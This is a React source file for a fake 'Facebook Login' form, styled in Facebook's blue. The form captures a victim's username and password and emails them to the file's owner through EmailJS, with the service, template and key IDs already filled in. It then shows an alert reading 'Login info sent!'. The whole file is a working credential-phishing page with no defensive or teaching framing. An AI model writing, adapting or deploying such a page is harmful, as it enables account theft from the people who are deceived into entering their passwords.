import React, { useState } from 'react';
import emailjs from 'emailjs-com';

export default function LoginForm() {
  const [form, setForm] = useState({ username: '', password: '' });

  const handleChange = (e) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    emailjs.send(
      'service_hs38pjh',     // Replace with your EmailJS service ID
      'template_fj9o2lc',    // Replace with your EmailJS template ID
      form,
      'DqyIJ9pt6PNh3kS2L'      // Replace with your EmailJS public key
    )
    .then(() => alert("Login info sent!"))
    .catch((error) => alert("Failed to send: " + error.text));
  };

  return (
    <form onSubmit={handleSubmit} style={styles.form}>
      <h2>Facebook Login</h2>
      <input
        type="text"
        name="username"
        placeholder="Username"
        value={form.username}
        onChange={handleChange}
        style={styles.input}
        required
      />
      <input
        type="password"
        name="password"
        placeholder="Password"
        value={form.password}
        onChange={handleChange}
        style={styles.input}
        required
      />
      <button type="submit" style={styles.button}>Log In</button>
    </form>
  );
}

const styles = {
  form: {
    maxWidth: 300,
    margin: 'auto',
    padding: 20,
    border: '1px solid #ccc',
    borderRadius: 10,
    textAlign: 'center',
    fontFamily: 'sans-serif'
  },
  input: {
    display: 'block',
    width: '100%',
    margin: '10px 0',
    padding: 10,
    borderRadius: 5,
    border: '1px solid #aaa'
  },
  button: {
    padding: 10,
    width: '100%',
    borderRadius: 5,
    backgroundColor: '#1877f2',
    color: 'white',
    border: 'none',
    fontSize: 16
  }
};
